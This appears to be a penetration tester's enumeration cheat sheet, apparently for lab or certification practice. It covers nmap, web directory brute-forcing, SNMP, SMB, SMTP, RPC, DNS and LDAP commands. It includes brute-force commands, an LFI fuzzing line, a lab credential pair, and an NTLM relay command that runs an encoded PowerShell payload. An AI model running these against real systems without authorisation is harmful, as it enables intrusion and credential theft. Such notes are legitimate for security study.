### nmap

```
nmap -sC -sV <IP>
nmap -A <IP>

nmap -p- -sC -sV <IP> --open
sudo nmap -Pn -sU -sC -sV <IP> #UDP
sudo nmap -sU --open <IP> #UDP
sudo nmap -sU -p161 --open <IP> #SNMP
sudo nmap -sU -sV -T4 -p161 <IP> #SNMP

nmap --script=http-enum <IP> -p80 #HTTP
nmap --script ftp-brute -p21 <IP> #FTP
sudo nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP> #TFTP

# search scripts
cd /usr/share/nmap/scripts/
cat script.db  | grep "\"vuln\""

# Nmap scan using all of the NSE scripts from the vuln category
sudo nmap -sV -p <port> --script "vuln" <IP>

nmap -p 139,445 --script smb-vuln* <IP>

sudo nmap -sU -p161 --script *snmp* <IP>
```

### enum web server

```
check source page 

whatweb <url>

wpscan --url <url>
wpscan --url <url> --enumerate p --plugins-detection aggressive #plugins
wpscan   --url <url> -ep 

use wappalyzer

autorecon <doamin name>

nikto -h <IP>

curl -s <url> | html2markdown
curl -s <url> | html2text

sudo ~/offsec/tools/finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <IP> | grep -v "is not known at this site"
```

### enumerate directories 

```
curl <url> | grep "href"

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u <url>/FUZZ

dirb <url> /usr/share/wordlists/dirb/common.txt

gobuster dir -u <url> -w /usr/share/wordlists/dirb/big.txt 
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt      

wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 <url>/FUZZ/

# git folder
feroxbuster -u <url> -x git

#recursive search
feroxbuster -u <url> --depth 2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# authenticated
gobuster dir -U admin -P admin -w /usr/share/wordlists/dirb/common.txt -u <url>

# https 
sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <url> -t 42 -k

feroxbuster -u <url> --depth 2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -k

# proxy
dirb <url> -p <url>

wordlists:
directory-list-2.3-medium.txt
directory-list-2.3-small.txt
common.txt
big.txt
raft-wordlist.txt
```


### subdomains

```
ffuf -w /usr/share/wordlists/Subdomain.txt -u http://siteisup.htb -H "Host: FUZZ.site.com"

gobuster dns --domain "site.com" --resolver "nameserver"  --wordlist /usr/share/wordlists/Subdomain.txt

gobuster dns -d site.com -w /usr/share/wordlists/Subdomain.txt 

another wordlist: subdomains-top1million-20000.txt
```

**enumerate directories after you found subdomain**

### LFI

```
wfuzz -c --hh=32 -z file,/usr/share/wordlists/LFI_payload.txt http://<IP>:<PORT>/view?page=FUZZ 
```

### SNMP

nmap
```
sudo nmap -sU -p161 --script *snmp* <IP>
```

brute-force comunity strings:
```
hydra -P /usr/share/metasploit-framework/data/wordlists/snmp\_default\_pass.txt <IP> snmp
```

you can use snmpwalk and snmpbulkwalk to enumerate, snmpbulkwalk is faster
```
# Enumerating the Entire MIB Tree
snmpwalk -c public -v1 192.168.204.149 
snmpbulkwalk 10.10.11.136 -v 2c -c public > output2.txt 

# Enumerating Users:
snmpwalk -c public -v1 192.168.204.149 1.3.6.1.4.1.77.1.2.25

# Enumerating Running Processes:
snmpwalk -c public -v1 192.168.204.149 1.3.6.1.2.1.25.4.2.1.2

# Enumerating Open TCP Ports:
snmpwalk -c public -v1 192.168.204.149 1.3.6.1.2.1.6.13.1.3

# Enumerating Installed Software:
snmpwalk -c public -v1 192.168.204.149 1.3.6.1.2.1.25.6.3.1.2

snmpwalk -c public -v1 192.168.204.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpwalk -c public -v1 192.168.204.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

attack:
https://shuciran.github.io/posts/SNMP-R&W-Community-Abuse/

another tool
```
onesixtyone
```

### SMTP

```
# connect
nc -nv <IP> 25
telnet <IP> 25

# command
VRFY <username>

# enumerate users
smtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t <IP>
```
 
 sendmail version: https://www.exploit-db.com/exploits/4761
### SMB

connect 

```
# anonymous login
smbclient -L //<IP> -N
smbmap -H <IP> -u guest

# null session
smbclient -L //<IP> -U ""
```

enumerate throw smb
```
# add domain if there is
smbmap -H <IP> -u guest -d <DOMAIN>

python3 nullinux.py <IP>

# if there are creds
smbmap -H <IP> -u <USER> -p <PASS>

# relay attack
sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "powershell -e JABjAGwAaQBlAG4AdAAg..."
```

nmap scripts on smb
```
nmap --script smb-enum-shares.nse -p445 <IP>

nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse 

nmap -p 139,445 --script smb-vuln* <IP>

nmap --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse -p 139,445 <IP>   
```

download all files
```
prompt
recurse ON
mget *
```

### FTP

connect 
```
ftp <IP>
```

download all files
```
wget -r --no-parent --ftp-user=<username> --ftp-password=<password> ftp://<IP>:<PORT>/
```
### TFTP

```
sudo nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP> #TFTP
```

https://github.com/EnableSecurity/tftptheft

### DNS enumeration

subdomain

```
ffuf -w /usr/share/wordlists/Subdomain.txt -u http://siteisup.htb -H "Host: FUZZ.site.com"

gobuster dns --domain "site.com" --resolver "nameserver"  --wordlist /usr/share/wordlists/Subdomain.txt

gobuster dns -d site.com -w /usr/share/wordlists/Subdomain.txt 

another wordlist: subdomains-top1million-20000.txt
```

enumeration
```
host www.megacorpone.com
host -t mx megacorpone.com
host -t txt megacorpone.com
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"

dnsrecon -d site.com -t std

dnsenum site.com

nslookup -type=TXT site.com <IP>
```

### RPC

```
showmount -e <IP>

rpcclient -U "" <IP>
rpcclient -N -U "" <IP>

rpcbind -p <IP>

rpcinfo –p <IP>

nmap --script rpcinfo.nse <IP>
nmap --script nfs-showmount.nse <IP>
```

rpcclient commands: https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/

rpcclient
```
dsr_enumtrustdom
getusername
lsaquery
enumdomusers
enumdomgroups
```

more: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration

enum users with SID, user name and password
```
#!/bin/bash 
sid="S-1-5-21-4254423774-1266059056-3197185112" for i in `seq 1000 1020`; do rpcclient -U "hazard%stealth1agent" -c "lookupsids $sid-$i;quit" <IP> | cut -d ' ' -f2 done
```

### Web application enumeration

- look in source files
- inspect HTTP response, headers and sitemaps
- abusing APIs - using curl request and burp suite 
- Cross-Site Scripting - looking for input that not sanitized like input that writes in logs file 
- SSTI
- jwt crack
### general in files

command to run on files to automate the process
```
# bash
for file in *; do [ -f "$file" ] && cut -f1 "$file"; done

# recursively search through all files and directories in the current directory for the string
grep -r "password" .  

# powershell
Get-ChildItem -File | ForEach-Object { Get-Content $_.FullName | ForEach-Object { $_ -split '\t' | Select-Object -First 1 } | Select-String -Pattern "username" }

Get-ChildItem -Recurse | Select-String -Pattern "hello"
Get-ChildItem -Recurse | Select-String -Pattern "hello" -CaseSensitive

# cmd
findstr /S /I /C:"hello" *.*
```

### DC

enumerate throw DC
```
enum4linux <DC IP>

ldapsearch -x -H ldap://<DC IP> -D '' -w '' -b "DC=domain,DC=com" |grep "Pass"
ldapsearch -x -b "DC=domain,DC=com" "*" -H ldap://<DC IP> | grep "userPrincipalName"

use windapsearch (nedd user and password)

# search for domain's users
kerbrute_linux_arm64 userenum -d domain.com --dc <DC IP> /usr/share/wordlists/xato-net-10-million-usernames.txt -t 100

use bloodhound-python (need user and password)
```